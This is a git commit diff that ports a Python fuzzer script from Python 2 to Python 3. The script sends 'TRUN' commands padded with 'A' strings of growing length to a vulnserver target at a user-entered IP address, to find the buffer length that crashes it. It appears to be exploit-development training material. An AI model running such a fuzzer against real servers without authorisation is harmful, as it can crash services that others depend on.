a7a6b3b9850246f75154d2691b272c38fdf24aca
Shamsher khan <32321996+shamsherkhan852@users.noreply.github.com>
2023-08-07 17:28:53 +0530

    1-fuzzer.py

--- 1-fuzzer.py
+++ 1-fuzzer.py
@@ -1,17 +1,18 @@
-#! /usr/bin/python
+#!/usr/bin/env python3
 
-import socket 
-import sys
+import socket
 
+ip_address = input("Enter the IP address of the target: ")
 buffer = ["A"]
-counter =  100
+counter = 100
+
 while len(buffer) <= 30:
-	buffer.append("A"*counter)
-	counter=counter+200
+    buffer.append("A" * counter)
+    counter = counter + 200
 
 for string in buffer:
-	print "Fuzzing vulnserver with %s bytes " % len(string)
-	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	connect=s.connect(('192.168.43.112',9999))
-	s.send(('TRUN /.:/' + string))
-	s.close()
+    print("Fuzzing vulnserver with %s bytes " % len(string))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip_address, 9999))
+    s.send(('TRUN /.:/' + string).encode())
+    s.close()
